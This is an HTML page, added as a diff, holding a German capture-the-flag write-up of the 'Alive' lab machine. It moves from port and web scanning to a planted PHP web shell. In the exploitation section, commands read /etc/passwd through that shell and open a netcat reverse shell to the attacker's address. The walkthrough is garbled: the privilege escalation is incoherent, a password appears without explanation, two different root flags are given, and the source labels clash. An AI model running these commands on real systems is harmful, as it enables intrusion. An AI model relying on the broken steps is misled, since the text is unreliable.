@@ -1,0 +1,454 @@
+﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alive - Vulnyx - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="nav-wrapper">
+        <div class="hamburger-nav-wrapper">
+            <input type="checkbox" id="hamburger-toggle">
+            <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </label>
+
+            <nav class="navbar" id="main-nav">
+                <a href="../../aboutme.html">Über mich</a>
+                <a href="../../index.html">HackMyVM</a>
+                <a href="../../vulnyx.html">Vulnyx</a>
+                <a href="../../vulnhub.html">Vulnhub</a> 
+            </nav>
+        </div>
+    </div>
+
+    <div class="header-bg">
+        <h1>Alive - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">searchsploit</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Initial Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Exploitation</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Initial Reconnaissance</h2>
+            In dieser Phase werden erste Informationen über das Zielsystem gesammelt.
+            ARP Scan
+            Einsatz von arp-scan zur Identifizierung aktiver Hosts im lokalen Netzwerk.
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─#  <span class="command">arp-scan -l</span>
+                    </div>
+                </div>
+                <div class="terminal">
+192.168.2.128 08:00:27:ea:1c:66 PCS Systemtechnik GmbH
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            Port Scanning und Service Enumeration<br>
+Mittels nmap werden offene Ports identifiziert und Service-Versionen ermittelt.<br>
+Nmap Scan
+ <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─#  <span class="command">nmap -sS -sC -T5 -AO 192.168.2.128 -p-</span>
+                    </div>
+                </div>
+ <div class="terminal">
+Starting Nmap 7.93 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2023-04-16 22:29 CEST<br>
+Nmap scan report for alive.hmv (192.168.2.128)<br>
+Host is up (0.00013s latency).<br>
+Not shown: 65533 closed tcp ports (reset)<br>
+PORT STATE SERVICE VERSION<br>
+22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>
+| ssh-hostkey:<br>
+| 3072 269c17ef21363d01c31d6b0d4711cd58 (RSA)<br>
+| 256 29266849b0375c0e7b6d818d60988dfc (ECDSA)<br>
+|_ 256 132e13190c9da3a73eb8dfab97084188 (ED25519)<br>
+80/tcp open http Apache httpd 2.4.54 ((Debian))<br>
+|_http-title: Host alive<br>
+|_http-server-header: Apache/2.4.54 (Debian)<br>
+MAC Address: 08:00:27:EA:1C:66 (Oracle VirtualBox virtual NIC)<br>
+Device type: general purpose<br>
+Running: Linux 4.X|5.X<br>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>
+OS details: Linux 4.15 - 5.6<br>
+Network Distance: 1 hop
+ </div>
+</div>
+Web Enumeration<br>
+Verwendung von gobuster zur Entdeckung versteckter Verzeichnisse und Dateien.<br>
+Gobuster Scan<br>
+ <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">gobuster dir -u http://192.168.2.128 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e --no-error</span>
+</div>
+==============================================================================================================================<br>
+<br>
+http://192.168.2.128/index.php (Status: 200) [Size: 1597]<br>
+http://192.168.2.128/tmp (Status: 301) [Size: 312] [--> <a href="http://192.168.2.128/tmp/">http://192.168.2.128/tmp/</a>]<br>
+==============================================================================================================================
+            </div>
+</div>
+ Nikto Scan<br>
+    Einsatz von nikto zur Identifizierung von Schwachstellen im Webserver.
+ <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">nikto -h 192.168.2.128</span>
+</div>
+- Nikto v2.5.0<br>
+---------------------------------------------------------------------------<br>
++ Target IP: 192.168.2.128<br>
++ Target Hostname: 192.168.2.128<br>
++ Target Port: 80<br>
++ Start Time: 2023-04-16 22:33:04 (GMT2)<br>
+---------------------------------------------------------------------------<br>
++ Server: Apache/2.4.54 (Debian)<br>
++ /: The anti-clickjacking X-Frame-Options header is not present. See: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</a><br>
++ /: The X-Content-Type-Options header is not set. See: <a href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</a><br>
++ No CGI Directories found (use '-C all' to force check all possible dirs)<br>
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.<br>
++ /tmp/: Directory indexing found.<br>
++ /tmp/: This might be interesting.<br>
++ 8103 requests: 0 error(s) and 5 item(s) reported on remote host<br>
++ End Time: 2023-04-16 22:33:15 (GMT2) (11 seconds)<br>
+---------------------------------------------------------------------------
+                </div>
+            </div>
+  <div class="code-block">
+Abrufen des Inhalts von index.php.
+                </div>
+   Analyse von index.php
+            <div class="code-block">
+   curl -s <a href="http://192.168.2.128/index.php">http://192.168.2.128/index.php</a>
+      }
+    
+  
+  
+    
+Check if a host is up !
+
+    
+
+      URL:<br>
+       <br>
+<br>
+  <br>
+<br>
+
+© 2023 All rights reserved. 
+ Contact us at: <a href="mailto:admin@alive.hmv">admin@alive.hmv</a>
+</div>
+                 
+     <div class="code-block">
+Identifizierung und Ausnutzung von index.phtml
+
+            Lokalisierung und Verwendung von index.phtml für die Codeausführung.
+          <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─# <span class="command">vi index.phtml</span>
+</div>
+                 </div>
+                 </div>
+           <div class="code-block">
+http://192.168.2.129:8080/index.phtml
+            </div>
+          <div class="code-block">
+Bereitstellung von index.html über einen lokalen Webserver.
+                </div>
+  Hosting von index.html
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─# <span class="command">python3 -m http.server 8080</span>
+</div>
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...<br>
+192.168.2.128 - - [16/Apr/2023 22:45:15] "GET /index.phtml HTTP/1.1" 200 -
+</div>
+ </div>
+ <div class="code-block">
+http://192.168.2.129:8080/index.html > tmp/index.phtml
+
+   <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─# <span class="command">python3 -m http.server 8080</span>
+</div>
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...<br>
+192.168.2.128 - - [16/Apr/2023 22:50:31] "GET /index.html HTTP/1.1" 200 -
+                </div>
+            </div>
+ </section>
+        <section id="initial-access">
+            <h2>Exploitation</h2>
+  Ausnutzung der gefundenen Schwachstellen zur Erlangung von Zugriff auf das System.
+ Command & Control und Reverse Shell<br>
+    Aufbau einer Reverse Shell über die index.phtml Schwachstelle.
+ 192.168.2.128/tmp/index.phtml?cmd=id<br>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
+<br>
+ 192.168.2.128/tmp/index.phtml?cmd=cat%20/etc/passwd%20|%20grep%20bash<br>
+root:x:0:0:root:/root:/bin/bash<br>
+alexandra:x:1000:1000:alexandra,,,:/home/alexandra:/bin/bash<br>
+                <div class="code-block">
+                    <div class="prompt">
+                        ┌──(root㉿cyber)-[~]<br>
+                        └─#  <span class="command">ssh alexandra@alive.hmv</span>
+                    </div>
+                </div>
+  The authenticity of host 'alive.hmv (192.168.2.128)' can't be established.
+                    ED25519 key fingerprint is SHA256:SBhxUVmtjWG7yvOCP0xTQp1FuQcWPwcbIwjHwDaiJ4A.
+                    This key is not known by any other names.
+                   Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+                  Warning: Permanently added 'alive.hmv' (ED25519) to the list of known hosts.
+
+                    Versuch, sich über SSH als Benutzer alexandra anzumelden.
+                       <div class="code-block">
+<span class="command">alexandra@alive.hmv's password: </span>
+
+                    Aufbau einer Reverse Shell über nc.
+                       <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">nc -lvnp 9001</span>
+</div>
+listening on [any] 9001 ...
+                  </div>
+                                       
+   192.168.2.128/tmp/index.phtml?cmd=nc -e /bin/bash 192.168.2.129 9001
+                          Reverse Shell Stabilisierung<br>
+Erhöhung der Benutzerrechte auf dem System.
+
+             Suche nach SUID Binaries
+Auflisten von Dateien mit SUID-Bit.
+            www-data@alive:/var/www/code$ <span class="command">sudo -l</span><br>
+
+           
+
+Wir vertrauen darauf, dass Sie die übliche Vorlesung vom örtlichen System erhalten haben<br>
+Administrator. Es läuft normalerweise auf diese drei Dinge hinaus:<br>
+<br>
+            #1) Respect the privacy of others.<br>
+            #2) Think before you type.<br>
+            #3) With great power comes great responsibility.<br>
+<br>
+[sudo] password for www-data: sudo: a password is required
+ <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">stty raw -echo;fg</span>
+</div>
+<span class="command">[1] + continued nc -lvnp 9001</span>
+</div>
+w-data@alive:/var/www/code$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+</div>
+ 416155 472 -rwsr-xr-x 1 root root 481608 Jul 2 2022 /usr/lib/openssh/ssh-keysign<br>
+ 407593 52 -rwsr-xr-- 1 root messagebus 51336 Oct 5 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>
+ 391772 88 -rwsr-xr-x 1 root root 88304 Feb 7 2020 /usr/bin/gpasswd<br>
+ 391773 64 -rwsr-xr-x 1 root root 63960 Feb 7 2020 /usr/bin/passwd<br>
+ 395793 56 -rwsr-xr-x 1 root root 55528 Jan 20 2022 /usr/bin/mount<br>
+ 391770 52 -rwsr-xr-x 1 root root 52880 Feb 7 2020 /usr/bin/chsh<br>
+ 391769 60 -rwsr-xr-x 1 root root 58416 Feb 7 2020 /usr/bin/chfn<br>
+ 395267 44 -rwsr-xr-x 1 root root 44632 Feb 7 2020 /usr/bin/newgrp<br>
+ 395426 72 -rwsr-xr-x 1 root root 71912 Jan 20 2022 /usr/bin/su<br>
+ 395795 36 -rwsr-xr-x 1 root root 35040 Jan 20 2022 /usr/bin/umount<br>
+ 424093 180 -rwsr-xr-x 1 root root 182600 Feb 27 2021 /usr/bin/sudo
+                </div>
+           
+  Zugriff auf user.txt
+
+Versuch, die user.txt Datei zu lesen.
+ <div class="code-block">
+www-data@alive:/home/alexandra$ cat user.txt<br>
+cat: user.txt: Permission denied<br>
+www-data@alive:/home/alexandra$ echo test > .ssh/test.txt<br>
+bash: .ssh/test.txt: Permission denied<br>
+www-data@alive:/home/alexandra$ ls .ssh/<br>
+ls: cannot open directory '.ssh/': Permission denied<br>
+www-data@alive:/tmp$<br>
+Ls /home/alexandra/.ssh/<br>
+ls: cannot open directory '/home/alexandra/.ssh/': Permission denied
+    </div>
+  Analyse von /opt/
+<br>
+    Untersuchung des /opt/ Verzeichnisses.<br>
+<www-data@alive:/tmp$cd /opt/</www-data@alive:/tmp$>
+ <div class="code-block">
+www-data@alive:/opt$ <span class="command">ls -la</span>
+total 16<br>
+drwxr-xr-x. 2 root root 4096 Jan 28 11:32 .<br>
+drwxr-xr-x. 18 root root 4096 Jan 17 07:01 ..<br>
+-rw-r--r-- 1 www-data www-data 252 Jan 14 10:04 backup.zip<br>
+-r--r--r--. 1 www-data www-data 149 Jan 14 10:04 index.html
+   
+
+ Download von backup.zip<br>
+  Herunterladen der backup.zip Datei.
+    <div class="code-block">
+<span class="command">www-data@alive:/opt$ python3 -m http.server 8001</span><br>
+Serving HTTP on 0.0.0.0 port 8001 (<a href="http://0.0.0.0:8001/">http://0.0.0.0:8001/</a>) ...<br>
+192.168.2.129 - - [16/Apr/2023 23:08:02] "GET /backup.zip HTTP/1.1" 200 -
+                    </div>
+                      <div class="terminal">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">wget http://192.168.2.128:8001/backup.zip</span>
+</div>
+-2023-04-16 23:08:00-- <a href="http://192.168.2.128:8001/backup.zip">http://192.168.2.128:8001/backup.zip</a><br>
+Verbindungsaufbau zu 192.168.2.128:8001 … verbunden.<br>
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK<br>
+Länge: 252 [application/zip]<br>
+Wird in »backup.zip« gespeichert.<br>
+<br>
+backup.zip 100%[=============================>] 252 --.-KB/s in 0,02s<br>
+<br>
+2023-04-16 23:08:00 (15,7 KB/s) - »backup.zip« gespeichert [252/252]
+</div>
+    </div>
+               Analyse von backup.zip<br>
+     Analyse und Entpacken von backup.zip
+                <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">ll</span>
+</div>
+total 298512<br>
+-rw-r--r-- 1 root root 252 14. Jan 10:04 backup.zip
+</div>
+ <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">zip2john backup.zip > hash</span>
+</div>
+ver 2.0 backup.zip/digitcode.bak is not encrypted,<br>
+or stored with non-handled compression type
+     <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">unzip backup.zip</span>
+</div>
+Archive: backup.zip<br>
+inflating: digitcode.bak
+     </div>
+
+       <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">file digitcode.bak</span>
+</div>
+digitcode.bak: ASCII text
+       </div>
+
+ <div class="code-block">
+<div class="prompt">
+┌──(root㉿cyber)-[~]<br>
+└─#  <span class="command">cat digitcode.bak</span>
+</div>
+host: alive.hmv<br>
+location: /var/www/code<br>
+param: digit<br>
+code: 494147203525673
+                </div>
+     Privilege Escalation
+Erhöhung der Benutzerrechte auf dem System.<br>
+MySQL Shell<br>
+Erhöhung der Berechtigung mit MySQL.
+ <div class="code-block">
+www-data@alive:/tmp/<span class="command">$ sudo -l</span>
+</div>
+            
+
+     
+  We trust you have received the usual lecture from the local System<br>
+ Administrator. It usually boils down to these three things:<br>
+<br>
+           #1) Respect the privacy of others.<br>
+            #2) Think before you type.<br>
+            #3) With great power comes great responsibility.<br>
+                       
+        
+
+        The Password for the "administrator" is required : heLL0alI4ns<br>
+         Die Passworteingabe erfolgt erst nachdem wir uns als www-data zu root gemacht haben
+                    <br>
+Ww-data@alive:/tmp/<span class="command">$ su admin</span>
+  cat root.txt
+
+                       0b29729cf5d1a3dbd9e70c0df6cf4a49 
+                      
+      <
+ Flags <br>
+                Flags
+         <div class="code-block">
+cat root.txt <br>
+819be2c3422a6121dac7e8b1da21ce32
+
+cat user.txt<br>
+  1637c0ee2d19e925bd6394c847a62ed5
+                </div>
+</section>
+  
+
+<div class="code-block">
+      
+ Penetrationstest Bericht
+
+          © 2023 Penetrationstest Bericht
+<br></div>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 20 Sep 2024</p>
+    </footer> 
+</body>
+</html>
